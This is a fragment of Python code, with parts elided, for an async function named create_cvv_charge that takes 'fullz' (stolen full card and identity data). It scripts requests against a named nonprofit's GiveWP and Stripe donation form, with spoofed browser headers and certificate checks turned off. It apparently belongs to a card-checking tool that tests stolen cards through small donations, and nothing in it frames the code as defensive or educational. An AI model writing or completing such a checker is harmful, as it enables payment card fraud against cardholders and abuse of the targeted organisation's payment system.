...
async def create_cvv_charge(fullz):
    try:
        ...
        async with httpx.AsyncClient(verify=False) as session:
            response = await session.get('https://livingroomconversations.org/donate/', headers=headers)

            headers['referer'] = 'https://livingroomconversations.org/donate/'
            ...
            response = await session.get('https://livingroomconversations.org/', params=params, headers=headers)
            ...
            headers = {
                ...
                'referer': f'https://livingroomconversations.org/?givewp-route=donation-form-view&form-id=1272&locale=en_US',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
            ...
            data = {
                ...
                'gatewayData[stripeKey]': (None, 'pk_live_...'),
                'gatewayData[stripeConnectedAccountId]': (None, 'acct_1BI2rXLb2HpJQ5gR'),
            }

            response = await session.post('https://livingroomconversations.org/', params=params, headers=headers, data=data)
            ...
            data = {
                ...
                "use_stripe_sdk": "true",
                "key": "pk_live_...stripe_key_redacted_for_security...",
